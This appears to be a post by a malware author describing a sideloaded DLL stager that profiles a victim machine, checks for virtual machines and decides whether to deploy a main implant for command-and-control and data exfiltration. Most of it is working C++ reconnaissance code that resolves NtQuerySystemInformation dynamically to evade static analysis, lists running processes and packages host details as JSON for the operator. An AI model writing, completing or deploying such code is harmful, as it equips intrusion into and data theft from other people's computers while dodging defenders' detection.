Using the .dll in the legit program, I scout the parameter, the machine configurations, if it's a virtual machine, deciding if the risk is worth it and decide if I should deploy my main implant which is the one responsible for C2, data exfiltration etc...

This is called modularization, so that I don't waste my malware signature for something useless.

// --- [RECON] NATIVE PROCESS SCOUTING ---
std::string GatherSystemInfoNative() {
    std::string procList = "";

    // Dynamically resolve ntdll!NtQuerySystemInformation
    // This hides the function call from static analysis
    fNtQuerySystemInformation pNtQuerySystemInformation = (fNtQuerySystemInformation)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

    if (!pNtQuerySystemInformation) return "{\"err\":\"ntdll_fail\"}";

    ULONG bufferSize = 0x10000; // 64KB initial buffer
    PVOID buffer = NULL;
    NTSTATUS status;

    // Call until buffer is large enough
    do {
        buffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buffer) return "{\"err\":\"mem_fail\"}";

        status = pNtQuerySystemInformation(5, buffer, bufferSize, &bufferSize); // 5 = SystemProcessInformation

        if (status == 0xC0000004) { // STATUS_INFO_LENGTH_MISMATCH
            VirtualFree(buffer, 0, MEM_RELEASE);
            bufferSize += 0x2000; // Increase buffer and try again
        }
    } while (status == 0xC0000004);

    if (status == 0) { // STATUS_SUCCESS
        PSYSTEM_PROCESS_INFORMATION pInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;
        while (true) {
            if (pInfo->ImageName.Buffer != NULL) {
                // Convert Wide String to Narrow String for JSON
                std::wstring ws(pInfo->ImageName.Buffer, pInfo->ImageName.Length / sizeof(wchar_t));
                std::string s(ws.begin(), ws.end());
                procList += s + "|";
            }
            if (pInfo->NextEntryOffset == 0) break;
            pInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pInfo + pInfo->NextEntryOffset);
        }
    }

    if (buffer) VirtualFree(buffer, 0, MEM_RELEASE);

    // Get Host/User as well
    char nameBuf[MAX_PATH];
    DWORD nameSize = MAX_PATH;
    std::string host = (GetComputerNameA(nameBuf, &nameSize)) ? nameBuf : "UNK";

    std::stringstream json;
    json << "{\"host\":\"" << host << "\",\"procs\":\"" << procList.substr(0, 600) << "\"}";
    return json.str();
}
